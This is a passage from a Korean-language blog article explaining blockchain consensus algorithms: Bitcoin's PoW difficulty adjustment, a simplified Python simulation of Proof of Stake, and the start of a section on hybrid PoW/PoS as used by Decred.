&#xC870;&#xC815;&#xD574;&#xC694;.<br><pre><code class="hljs cpp">bnNew *= nActualTimespan;bnNew /= params.nPowTargetTimespan;</code></pre></p><p>&#xC989;, <em>&#xC0C8;&#xB85C;&#xC6B4; &#xB09C;&#xC774;&#xB3C4; =  (&#xAE30;&#xC874; &#xB09C;&#xC774;&#xB3C4;x&#xC2E4;&#xC81C; &#xAC78;&#xB9B0; &#xC2DC;&#xAC04;)/&#xBAA9;&#xD45C; &#xC2DC;&#xAC04;</em> &#xC758; &#xACF5;&#xC2DD;&#xC73C;&#xB85C; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xC870;&#xC815;&#xD568;&#xC73C;&#xB85C;&#xC368;, &#xBE14;&#xB85D; &#xC0DD;&#xC131; &#xC18D;&#xB3C4;&#xB97C; &#xD3C9;&#xADE0; 10&#xBD84;&#xC73C;&#xB85C; &#xC720;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;</p><p>[5] &#xB610;&#xD55C;, &#xB09C;&#xC774;&#xB3C4;&#xAC00; &#xB108;&#xBB34; &#xB0AE;&#xC544;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD574; &#xCD5C;&#xC18C; &#xB09C;&#xC774;&#xB3C4;(<code>bnPowLimit</code>)&#xBCF4;&#xB2E4; &#xB0AE;&#xC544;&#xC9C0;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (bnNew &gt; bnPowLimit)    bnNew = bnPowLimit;</code></pre><br>&#xC774;&#xB807;&#xAC8C; &#xACC4;&#xC0B0;&#xB41C; &#xB09C;&#xC774;&#xB3C4;&#xB294; &#xB2E4;&#xC74C; &#xBE14;&#xB85D;&#xC758; &#xB09C;&#xC774;&#xB3C4;&#xB85C; &#xC801;&#xC6A9;&#xB418;&#xBA70;, &#xCC44;&#xAD74;&#xC790;&#xB294; &#xC774; &#xBAA9;&#xD45C;&#xAC12;&#xC744; &#xD574;&#xACB0;&#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xC804; &#xC5F0;&#xAD6C; &#xAE00;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD588;&#xB4EF;&#xC774;, PoW &#xBC29;&#xC2DD;&#xC740; &#xB9C9;&#xB300;&#xD55C; &#xC5F0;&#xC0B0;&#xB7C9;&#xC744; &#xC694;&#xAD6C;&#xD558;&#xC5EC; &#xC804;&#xB825; &#xC18C;&#xBE44;&#xAC00; &#xB9E4;&#xC6B0; &#xD07D;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xB300;&#xADDC;&#xBAA8; &#xCC44;&#xAD74;&#xC7A5;(mining pool)&#xC758; &#xB4F1;&#xC7A5;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xD2B9;&#xC815; &#xADF8;&#xB8F9;&#xC774; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC804;&#xCCB4; &#xD574;&#xC2DC; &#xD30C;&#xC6CC;&#xC758; 51% &#xC774;&#xC0C1;&#xC744; &#xD655;&#xBCF4;&#xD558;&#xAC8C; &#xB418;&#xBA74;, &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xC870;&#xC791; &#xBC0F; &#xC774;&#xC911; &#xC9C0;&#xBD88;(Double Spending) &#xACF5;&#xACA9;&#xC758; &#xC704;&#xD5D8;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; PoW&#xC758; &#xD55C;&#xACC4;&#xB97C; &#xADF9;&#xBCF5;&#xD558;&#xAE30; &#xC704;&#xD574;, &#xC9C0;&#xBD84; &#xC99D;&#xBA85;(Proof of Stake, PoS) &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xB3C4;&#xC785;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="2-Proof-of-Stake-PoS"><a href="#2-Proof-of-Stake-PoS" class="headerlink" title="2. Proof of Stake (PoS)"></a>2. Proof of Stake (PoS)</h1><p>&#xC9C0;&#xBD84; &#xC99D;&#xBA85;&#xC740; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0;&#xC11C;  &#xCF54;&#xC778;&#xC758; &#xBCF4;&#xC720;&#xB7C9;&#xACFC; &#xBCF4;&#xC720; &#xAE30;&#xAC04;&#xC5D0; &#xB530;&#xB77C; &#xBE14;&#xB85D; &#xC0DD;&#xC131;&#xACFC; &#xAC80;&#xC99D; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xB294; &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC785;&#xB2C8;&#xB2E4;. PoW&#xC5D0;&#xC11C;&#xB294; &#xBCF5;&#xC7A1;&#xD55C; &#xC218;&#xD559; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xC57C;&#xD558;&#xC9C0;&#xB9CC;, PoS&#xC5D0;&#xC11C;&#xB294; &#xD574;&#xB2F9; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xCF54;&#xC778;&#xC744; &#xC77C;&#xC815;&#xB7C9; &#xC608;&#xCE58;(Staking)&#xD558;&#xBA74; &#xAC80;&#xC99D;&#xC790;(validator)&#xB85C; &#xCC38;&#xC5EC;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;.<br>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xAC80;&#xC99D;&#xC790;&#xB294; &#xBCF4;&#xC720;&#xD55C; &#xC9C0;&#xBD84;&#xC758; &#xD06C;&#xAE30;&#xC5D0; &#xB530;&#xB77C; &#xBE14;&#xB85D; &#xC0DD;&#xC131; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC544;&#xC9D1;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xC815;&#xC9C1;&#xD55C; &#xD589;&#xB3D9;&#xC744; &#xD558;&#xBA74; &#xBCF4;&#xC0C1;&#xC744; &#xBC1B;&#xACE0;, &#xBD80;&#xC815;&#xD589;&#xC704;&#xB97C; &#xD558;&#xBA74; &#xD328;&#xB110;&#xD2F0;(&#xC608;&#xCE58;&#xAE08; &#xC0AD;&#xAC10;)&#xB97C; &#xBC1B;&#xB294; &#xACBD;&#xC81C;&#xC801; &#xC778;&#xC13C;&#xD2F0;&#xBE0C;&#xB97C; &#xD1B5;&#xD574; &#xBCF4;&#xC548;&#xC131;&#xC744; &#xB192;&#xC785;&#xB2C8;&#xB2E4;. PoS &#xAC1C;&#xB150;&#xC740; 2012&#xB144; Peercoin&#xC5D0;&#xC11C; &#xCD5C;&#xCD08;&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xACE0;, &#xC774;&#xD6C4; &#xB9CE;&#xC740; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC774; &#xC774; &#xBC29;&#xC2DD;&#xC744; &#xCC44;&#xD0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. 2022&#xB144;&#xC5D0;&#xB294; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xB3C4; PoW&#xC5D0;&#xC11C; PoS&#xB85C; &#xC804;&#xD658;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/09/bekim/consensus_algorithm/ko/image1.png" alt></p><p>&#xC0AC;&#xC2E4; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC744; &#xC608;&#xC2DC;&#xB85C; PoS&#xC758; &#xC791;&#xB3D9; &#xBC29;&#xC2DD;&#xC744; &#xC124;&#xBA85;&#xD558;&#xACE0; &#xC2F6;&#xC5C8;&#xB294;&#xB370;, &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xD558;&#xB824;&#xBA74; &#xC5F0;&#xAD6C;&#xAE00;&#xC774; &#xB108;&#xBB34; &#xAE38;&#xC5B4;&#xC9C8; &#xAC83; &#xAC19;&#xC544;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xC5C4;&#xCCAD; &#xB2E8;&#xC21C;&#xD654;&#xD55C; PoS &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xB9AC;&#xB97C; &#xD30C;&#xC545;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> time// [<span class="hljs-number">1</span>]<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Validator</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, address, stake</span>):</span>        self.address = address  <span class="hljs-comment"># Validator address</span>        self.stake = stake         self.vote_weight = stake          <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Validator(<span class="hljs-subst">{self.address}</span>, Stake: <span class="hljs-subst">{self.stake}</span>)&quot;</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PoSBlockchain</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>        self.validators = []         self.blocks = []        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register_validator</span>(<span class="hljs-params">self, address, stake</span>):</span>        <span class="hljs-keyword">if</span> stake &lt; <span class="hljs-number">32</span>:            print(<span class="hljs-string">f&quot;[ERROR] <span class="hljs-subst">{address}</span> need to stake over 32 ETH&quot;</span>)            <span class="hljs-keyword">return</span>        validator = Validator(address, stake)        self.validators.append(validator)        print(<span class="hljs-string">f&quot;[INFO] <span class="hljs-subst">{validator}</span> registered as a validator.&quot;</span>)// [<span class="hljs-number">2</span>]    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">select_proposer</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-string">&quot;&quot;&quot; Randomly select a block proposer &quot;&quot;&quot;</span>        total_stake = sum(v.stake <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> self.validators)        rand_value = random.uniform(<span class="hljs-number">0</span>, total_stake)                cumulative = <span class="hljs-number">0</span>        <span class="hljs-keyword">for</span> validator <span class="hljs-keyword">in</span> self.validators:            cumulative += validator.stake            <span class="hljs-keyword">if</span> rand_value &lt;= cumulative:                print(<span class="hljs-string">f&quot;[INFO] selected validator: <span class="hljs-subst">{validator.address}</span>&quot;</span>)                <span class="hljs-keyword">return</span> validator// [<span class="hljs-number">3</span>]    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_block</span>(<span class="hljs-params">self, proposer</span>):</span>        <span class="hljs-string">&quot;&quot;&quot; Generate a block and calculate hash &quot;&quot;&quot;</span>        prev_hash = self.blocks[<span class="hljs-number">-1</span>][<span class="hljs-string">&apos;hash&apos;</span>] <span class="hljs-keyword">if</span> self.blocks <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;GENESIS&quot;</span>        timestamp = time.time()        block_data = <span class="hljs-string">f&quot;<span class="hljs-subst">{proposer.address}</span>-<span class="hljs-subst">{timestamp}</span>-<span class="hljs-subst">{prev_hash}</span>&quot;</span>        block_hash = hashlib.sha256(block_data.encode()).hexdigest()        block = {<span class="hljs-string">&quot;proposer&quot;</span>: proposer.address, <span class="hljs-string">&quot;hash&quot;</span>: block_hash, <span class="hljs-string">&quot;prev_hash&quot;</span>: prev_hash}        <span class="hljs-keyword">return</span> block// [<span class="hljs-number">4</span>]    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">validate_and_vote</span>(<span class="hljs-params">self, block</span>):</span>        votes = <span class="hljs-number">0</span>        <span class="hljs-keyword">for</span> validator <span class="hljs-keyword">in</span> self.validators:            <span class="hljs-keyword">if</span> random.random() &gt; <span class="hljs-number">0.1</span>:  <span class="hljs-comment"># 90% probability of a valid vote</span>                votes += validator.vote_weight                required_votes = sum(v.stake <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> self.validators) * <span class="hljs-number">0.67</span>  <span class="hljs-comment"># At least 67% approval required</span>        <span class="hljs-keyword">if</span> votes &gt;= required_votes:            self.blocks.append(block)            print(<span class="hljs-string">f&quot;[INFO] Validation: <span class="hljs-subst">{block[<span class="hljs-string">&apos;hash&apos;</span>]}</span>&quot;</span>)            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>        <span class="hljs-keyword">else</span>:            print(<span class="hljs-string">&quot;[WARNING] Not enough votes &quot;</span>)            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>// [<span class="hljs-number">5</span>]    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_consensus</span>(<span class="hljs-params">self</span>):</span>        proposer = self.select_proposer()        <span class="hljs-keyword">if</span> proposer:            new_block = self.create_block(proposer)            self.validate_and_vote(new_block)pos_chain = PoSBlockchain()pos_chain.register_validator(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">50</span>)pos_chain.register_validator(<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-number">40</span>)pos_chain.register_validator(<span class="hljs-string">&quot;Charlie&quot;</span>, <span class="hljs-number">32</span>)pos_chain.register_validator(<span class="hljs-string">&quot;Dave&quot;</span>, <span class="hljs-number">100</span>)<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    pos_chain.run_consensus()</code></pre></p><p>[1] &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC5D0;&#xC11C;&#xB294; 32ETH&#xC744; &#xC608;&#xCE58;(Staking)&#xD574;&#xC57C; &#xAC80;&#xC99D;&#xC790;&#xB85C; &#xCC38;&#xC5EC;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;.<br><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Validator</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, address, stake</span>):</span>        self.address = address          self.stake = stake              <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Validator(<span class="hljs-subst">{self.address}</span>, Stake: <span class="hljs-subst">{self.stake}</span>)&quot;</span></code></pre></p><p>[2] &#xB354; &#xB9CE;&#xC740; &#xCF54;&#xC778;&#xC744; &#xC2A4;&#xD14C;&#xC774;&#xD0B9;&#xD55C; &#xCC38;&#xC5EC;&#xC790;&#xAC00; &#xB2E4;&#xC74C; &#xBE14;&#xB85D; &#xAC80;&#xC99D;&#xC790;&#xB85C; &#xC120;&#xD0DD;&#xB420; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xD06C;&#xC9C0;&#xB9CC;, &#xB09C;&#xC218; &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xB4F1;&#xC744; &#xD1B5;&#xD574; &#xC608;&#xCE21; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xC120;&#xD0DD;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xACF5;&#xACA9;&#xC744; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">select_proposer</span>(<span class="hljs-params">self</span>):</span>    <span class="hljs-string">&quot;&quot;&quot;Select a block proposer randomly, weighted by stake&quot;&quot;&quot;</span>    total_stake = sum(v.stake <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> self.validators.values())    rand_value = random.uniform(<span class="hljs-number">0</span>, total_stake)    cumulative = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> validator <span class="hljs-keyword">in</span> self.validators.values():        cumulative += validator.stake        <span class="hljs-keyword">if</span> rand_value &lt;= cumulative:            print(<span class="hljs-string">f&quot;[INFO] Selected proposer: <span class="hljs-subst">{validator.address}</span>&quot;</span>)            <span class="hljs-keyword">return</span> validator    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></code></pre></p><p>[3] &#xC120;&#xC815;&#xB41C; &#xAC80;&#xC99D;&#xC790;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xAC70;&#xB798;&#xB4E4;&#xC744; &#xBB36;&#xC5B4; &#xBE14;&#xB85D;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0; &#xC81C;&#xC548;&#xD569;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_block</span>(<span class="hljs-params">self, proposer</span>):</span>    <span class="hljs-string">&quot;&quot;&quot;Generate a new block&quot;&quot;&quot;</span>    prev_hash = self.blockchain[<span class="hljs-number">-1</span>][<span class="hljs-string">&apos;Hash&apos;</span>]    new_block = {        <span class="hljs-string">&quot;Index&quot;</span>: len(self.blockchain),        <span class="hljs-string">&quot;Timestamp&quot;</span>: str(datetime.now()),        <span class="hljs-string">&quot;PrevHash&quot;</span>: prev_hash,        <span class="hljs-string">&quot;Validator&quot;</span>: proposer.address    }    new_block[<span class="hljs-string">&quot;Hash&quot;</span>] = self.hash_block(new_block)    <span class="hljs-keyword">return</span> new_block</code></pre></p><p>[4] &#xADF8; &#xC678;&#xC758; &#xB2E4;&#xB978; &#xAC80;&#xC99D;&#xC790;&#xB4E4;&#xC740; &#xD574;&#xB2F9; &#xBE14;&#xB85D;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xACE0; &#xD22C;&#xD45C;&#xB97C; &#xC9C4;&#xD589;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xD569;&#xC758;&#xC5D0; &#xCC38;&#xC5EC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC758; &#xACBD;&#xC6B0;, &#xCD5C;&#xC18C; 128&#xBA85;&#xC758; &#xAC80;&#xC99D;&#xC790;&#xAC00; &#xBE14;&#xB85D;&#xC744; &#xAC80;&#xD1A0;&#xD558;&#xACE0; &#xD22C;&#xD45C;&#xD574;&#xC57C;&#xD574;&#xC694;. &#xC774; &#xD22C;&#xD45C;&#xB97C; &#xD1B5;&#xD574; &#xCDA9;&#xBD84;&#xD55C; &#xD569;&#xC758;(Consensus)&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xBA74;, &#xC774; &#xBE14;&#xB85D;&#xC774; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xB294; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">validate_and_vote</span>(<span class="hljs-params">self, block</span>):</span>    <span class="hljs-string">&quot;&quot;&quot;Simulate validator voting process&quot;&quot;&quot;</span>    total_stake = sum(v.stake <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> self.validators.values())    votes = sum(v.stake <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> self.validators.values() <span class="hljs-keyword">if</span> random.random() &gt; <span class="hljs-number">0.1</span>)  <span class="hljs-comment"># # 90% chance to approve</span>    <span class="hljs-keyword">if</span> votes &gt;= total_stake * <span class="hljs-number">0.67</span>:  <span class="hljs-comment"># Requires at least 67% approval </span>        self.blockchain.append(block)        print(<span class="hljs-string">f&quot;[INFO] Block added: <span class="hljs-subst">{block[<span class="hljs-string">&apos;Hash&apos;</span>]}</span>&quot;</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&quot;[WARNING] Block rejected due to insufficient votes.&quot;</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre></p><p>[5] &#xC774;&#xB807;&#xAC8C; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xBE14;&#xB85D;&#xC744; &#xC0DD;&#xC131;&#xD55C; &#xAC80;&#xC99D;&#xC790;&#xB294; &#xAC70;&#xB798; &#xC218;&#xC218;&#xB8CC; &#xBC0F; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xBCF4;&#xC0C1;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_consensus</span>(<span class="hljs-params">self</span>):</span>    <span class="hljs-string">&quot;&quot;&quot;Run the PoS consensus process&quot;&quot;&quot;</span>    proposer = self.select_proposer()    <span class="hljs-keyword">if</span> proposer:        new_block = self.create_block(proposer)        self.validate_and_vote(new_block)        proposer.stake += <span class="hljs-number">5</span>  <span class="hljs-comment"># reward</span>        print(<span class="hljs-string">f&quot;[INFO] <span class="hljs-subst">{proposer.address}</span> received 5 ETH as a reward.&quot;</span>)</code></pre><br>&#xBC18;&#xB300;&#xB85C; &#xAC80;&#xC99D;&#xC790;&#xAC00; &#xBD80;&#xC815;&#xD589;&#xC704;&#xB97C; &#xD558;&#xAC70;&#xB098; &#xC694;&#xAD6C;&#xB41C; &#xAC80;&#xC99D; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xD328;&#xB110;&#xD2F0;&#xAC00; &#xC8FC;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xAC80;&#xC99D;&#xC790;&#xAC00; &#xC624;&#xD504;&#xB77C;&#xC778; &#xC0C1;&#xD0DC;&#xC5EC;&#xC11C; &#xBE14;&#xB85D;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xBA74; &#xBCF4;&#xC0C1;&#xC774; &#xC904;&#xC5B4;&#xB4E4;&#xAC70;&#xB098; &#xC77C;&#xBD80; &#xC9C0;&#xBD84;&#xC744; &#xC0AD;&#xAC10;&#xB2F9;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xC774;&#xC911; &#xC11C;&#xBA85;&#xC774;&#xB098; &#xC798;&#xBABB;&#xB41C; &#xBE14;&#xB85D; &#xC2B9;&#xC778;&#xACFC; &#xAC19;&#xC740; &#xBD80;&#xC815;&#xD589;&#xC704;&#xB97C; &#xD560; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC2AC;&#xB798;&#xC2F1;(Slash)&#xB418;&#xC5B4; &#xC608;&#xCE58;&#xD55C; &#xC9C0;&#xBD84; &#xC77C;&#xBD80; &#xB610;&#xB294; &#xC804;&#xBD80;&#xB97C; &#xBAB0;&#xC218;&#xB2F9;&#xD558;&#xACE0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xD1F4;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xB530;&#xB77C;&#xC11C; PoS&#xB294; &#xC774;&#xB7F0; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xBCF4;&#xC548;&#xACFC; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xBA74;&#xC11C;&#xB3C4;, PoW&#xBCF4;&#xB2E4; &#xC5D0;&#xB108;&#xC9C0; &#xD6A8;&#xC728;&#xC801;&#xC778; &#xD569;&#xC758; &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; PoS &#xC5ED;&#xC2DC; &#xCF54;&#xC778; &#xC9C0;&#xBD84;&#xC774; &#xB9CE;&#xC740; &#xC0AC;&#xB78C;&#xC774; &#xACC4;&#xC18D;&#xD574;&#xC11C; &#xC720;&#xB9AC;&#xD574;&#xC9C0;&#xB294; &#xAD6C;&#xC870;&#xC801; &#xD55C;&#xACC4;&#xB97C; &#xAC00;&#xC9C0;&#xBA70;, &#xC911;&#xC559;&#xD654; &#xC704;&#xD5D8;&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xB2E8;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="3-Hybrid-PoW-PoS"><a href="#3-Hybrid-PoW-PoS" class="headerlink" title="3. Hybrid PoW/PoS"></a>3. Hybrid PoW/PoS</h1><p><img src="/2025/03/09/bekim/consensus_algorithm/ko/image2.png" alt></p><blockquote><p>Complete Overview of Decred&#x2019;s Structure [&#xCD9C;&#xCC98;: <a href="https://medium.com/decred/blockchain-governance-how-decred-iterates-upon-bitcoin-3cc7030c655e">https://medium.com/decred/blockchain-governance-how-decred-iterates-upon-bitcoin-3cc7030c655e</a>]</p></blockquote><p>&#xAE30;&#xC874; PoW&#xB294; &#xB192;&#xC740; &#xBCF4;&#xC548;&#xC131;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0;&#xB9CC; &#xC5D0;&#xB108;&#xC9C0; &#xC18C;&#xBE44;&#xAC00; &#xB192;&#xACE0; &#xCC44;&#xAD74; &#xB3C5;&#xC810; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC18;&#xBA74; PoS &#xBC29;&#xC2DD;&#xC740; &#xC5D0;&#xB108;&#xC9C0; &#xD6A8;&#xC728;&#xC801;&#xC774;&#xC9C0;&#xB9CC; &#xAC80;&#xC99D;&#xC790; &#xB3C5;&#xC810; &#xC704;&#xD5D8;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; Hybrid PoW/PoS &#xBAA8;&#xB378;&#xC774; &#xB4F1;&#xC7A5;&#xD588;&#xC73C;&#xBA70;, &#xC774; &#xBC29;&#xC2DD;&#xC5D0;&#xC11C;&#xB294; PoW&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xBE14;&#xB85D;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; PoS &#xAC80;&#xC99D;&#xC790;&#xB4E4;&#xC774; &#xBE14;&#xB85D;&#xC744; &#xC2B9;&#xC778;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xB97C; &#xCC44;&#xD0DD;&#xD588;&#xC5B4;&#xC694;.</p><p>&#xBA3C;&#xC800;, Proof-of-Work &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xCC44;&#xAD74;&#xC790;&#xAC00; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD574;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; &#xBE14;&#xB85D;&#xC744; &#xC0DD;&#xC131;&#xD574;&#xC694;. &#xD558;&#xC9C0;&#xB9CC; &#xC0DD;&#xC131;&#xB41C; &#xBE14;&#xB85D;&#xC774; &#xBC14;&#xB85C; &#xCCB4;&#xC778;&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2CC;, PoS &#xAC80;&#xC99D;&#xC790;&#xB4E4;&#xC758; &#xD22C;&#xD45C;&#xB97C; &#xD1B5;&#xD574; &#xCD5C;&#xC885; &#xC2B9;&#xC778; &#xAC78;&#xCC28;&#xB97C; &#xAC70;&#xCE69;&#xB2C8;&#xB2E4;. PoS &#xAC80;&#xC99D;&#xC790;&#xB4E4;&#xC740; &#xC790;&#xC2E0;&#xC774; &#xBCF4;&#xC720;&#xD55C; &#xCF54;&#xC778;&#xC744; &#xC77C;&#xC815;&#xB7C9; &#xC608;&#xCE58;(staking)&#xD558;&#xC5EC; &#xAC80;&#xC99D;&#xC790;&#xB85C; &#xCC38;&#xC5EC;&#xD558;&#xACE0;, &#xB79C;&#xB364;&#xD558;&#xAC8C; &#xC120;&#xD0DD;&#xB41C; &#xAC80;&#xC99D;&#xC790;&#xB4E4;&#xC774; &#xD574;&#xB2F9; &#xBE14;&#xB85D;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xD3C9;&#xAC00;&#xD558;&#xACE0; &#xD22C;&#xD45C;&#xD569;&#xB2C8;&#xB2E4;. &#xBCF4;&#xD1B5; &#xAC80;&#xC99D;&#xC790; 5&#xBA85; &#xC911; 3&#xBA85; &#xC774;&#xC0C1;&#xC774; &#xCC2C;&#xC131;&#xD558;&#xBA74; &#xBE14;&#xB85D;&#xC774; &#xC2B9;&#xC778;&#xB418;&#xBA70;, &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xBCF4;&#xC0C1;&#xC740; PoW 